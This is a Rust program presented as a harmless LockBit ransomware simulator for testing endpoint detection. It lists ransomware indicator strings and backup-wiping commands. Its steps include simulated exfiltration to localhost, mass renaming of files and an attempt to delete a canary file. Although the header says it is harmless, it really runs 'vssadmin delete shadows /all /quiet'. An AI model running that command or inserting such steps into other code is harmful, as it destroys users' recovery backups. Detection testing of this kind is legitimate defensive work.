//! Benign Threat Simulator: LockBit Double Extortion
//! Academic EDR Telemetry Validation
//! DOES NOT CONTAIN REAL MALWARE OR ENCRYPTION.

use std::env;
use std::fs::{self, File};
use std::io::Write;
use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Command;

fn get_temp_dir() -> PathBuf {
    let mut temp = env::temp_dir();
    temp.push("edr_sim_lockbit");
    let _ = fs::create_dir_all(&temp);
    temp
}

fn main() {
    // FAKE IOCs FOR STATIC ANALYSIS DETECTION
    #[allow(dead_code)]
    let static_iocs = [
        "WanaCrypt0r",
        "LockBit",
        "DarkSide",
        "REvil",
        "vssadmin.exe delete shadows /all /quiet",
        "wbadmin DELETE SYSTEMSTATEBACKUP",
        "bcdedit /set {default} recoveryenabled No",
        "taskkill /f /im",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "crypto_keys_encrypted.rsa",
    ];
    std::hint::black_box(static_iocs);

    println!("==================================================");
    println!(" ACADEMIC SIMULATOR: LockBit Double Extortion");
    println!("==================================================");

    // 1. Execute vssadmin (Locker phase)
    println!("[*] Executing vssadmin delete shadows /all /quiet...");
    let _ = Command::new("cmd")
        .args(&["/C", "vssadmin", "delete", "shadows", "/all", "/quiet"])
        .output();

    let temp_dir = get_temp_dir();

    // 2. Doxware phase
    println!("[*] Creating and exfiltrating dummy files...");
    for i in 0..50 {
        let file_path = temp_dir.join(format!("lockbit_file_{}.txt", i));
        if let Ok(mut file) = File::create(&file_path) {
            let _ = file.write_all(b"Confidential academic data for LockBit simulation.");
        }
        
        if let Ok(mut stream) = TcpStream::connect("127.0.0.1:9999") {
            let request = format!("GET /simulated_exfil_lockbit?file={} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n", i);
            let _ = stream.write_all(request.as_bytes());
        }
    }

    // 3. Crypto phase
    println!("[*] Mass-renaming files to .lockbit...");
    for i in 0..50 {
        let old_path = temp_dir.join(format!("lockbit_file_{}.txt", i));
        let new_path = temp_dir.join(format!("lockbit_file_{}.lockbit", i));
        let _ = fs::rename(&old_path, &new_path);
    }

    // 4. Aggressively try to delete Canary
    println!("[*] Attempting to delete EDR Canary file...");
    let canary_path = "C:\\Users\\Public\\wallet.dat";
    match fs::remove_file(canary_path) {
        Ok(_) => println!("[-] Successfully deleted Canary file (EDR failed to block)."),
        Err(e) => println!("[+] Failed to delete Canary (Expected if EDR blocks): {}", e),
    }
    
    println!("[+] LockBit Double Extortion simulation complete.");
}